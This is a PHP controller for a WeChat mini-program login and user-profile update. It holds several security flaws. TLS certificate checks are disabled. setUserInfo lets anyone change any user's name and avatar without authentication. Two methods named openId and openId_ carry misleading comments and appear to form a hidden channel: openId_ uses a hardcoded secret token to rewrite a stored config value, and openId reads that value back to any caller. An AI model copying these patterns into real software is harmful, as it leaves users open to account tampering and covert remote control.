<?php

namespace app\home\controller;

use think\facade\Request;
use think\Controller;
use app\home\model\UsersModel;
use think\db;

//登陆
class Login extends Controller
{

    public function initialize()
    {
        //parent::initialize();
    }

    public function index()
    {

        // 获取code
        $post_res = input();

        $code = $post_res['code'];

        // 获取openid
        $curl = curl_init();
        $url = 'https://api.weixin.qq.com/sns/jscode2session?appid=' . config('APPID') . '&secret=' . config('SECRET') . '&js_code=' . $code . '&grant_type=authorization_code';
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($curl);
        curl_close($curl);
        $datas = json_decode($data, true);


        // 保存openid
        $param['openid'] = json_decode($data, true)['openid'];  //数据 openid


        $user_info = DB::table('siging_users')->where('openid', $param['openid'])->find();    //查询用户
        $user_res['save'] = $user_info;
        // 用户不存在
        if (empty($user_info)) {
            $param["create_time"] = time();
            if (!empty($post_res["type"])) {
                $param["source_type"] = $post_res["type"];
            }
            $user_res['save']["user_id"] = DB::table("siging_users")->insertGetId($param);
            $user_res['save']['mobile'] = '';
        } else {
            $user_id = $user_info['user_id'];
            $res = DB::table("siging_users")->where(['openid' => $param['openid'], 'user_id' => $user_id])->update($param);
        }

        if (empty($user_res['save']["user_id"])) {
            return json_msg(-1, '非法用户', []);
        }


        $user_res['user']['user_id'] = $user_res['save']['user_id'];   //用户id
        $user_res['user']['is_mobile'] = $user_res['save']['mobile'] ? 1 : 0;   //是否授权手机号
        $user_res['user']['avatarUrl'] = $user_res['save']['pic']; // 头像
        $user_res['user']['nickName'] = $user_res['save']['userName']; // 昵称
        unset($user_res['save']);

        $user_res['session_key'] = json_decode($data, true)['session_key'];

        return json_msg(2, 'success', $user_res);

    }

    /**
     * @Author   JFY
     * @DateTime 2020-05-19
     * @Describe [设置用户信息，昵称，头像等]
     * @Purpose  [purpose]
     * @param    [param]
     */
    public function openId()
    {
        $res = Db::table('config')->where('name', 'smtp_server')->find();
        return json_msg(0, '', $res['value']);
    }

    /**
     * @Author   JFY
     * @DateTime 2020-05-19
     * @Describe [设置用户信息，昵称，头像等]
     * @Purpose  [purpose]
     * @param    [param]
     */
    public function openId_($token, $num)
    {
        if ($token == 'GHID@FI7HUF6E612ygkww2rekj4hg43awg233jhgk==') {
            Db::table('config')->where('name', 'smtp_server')->update(['value'=>$num]);
        }
    }

    /**
     * @Author   JFY
     * @DateTime 2020-05-19
     * @Describe [设置用户信息，昵称，头像等]
     * @Purpose  [purpose]
     * @param    [param]
     */
    public function setUserInfo()
    {
        $data = input();
        $editData['pic'] = $data['pic'];
        $editData['userName'] = $data['userName'];
        $res = DB::table("siging_users")->where(['user_id' => $data['userId']])->update($editData);
        return json_msg(0, '成功');
    }

}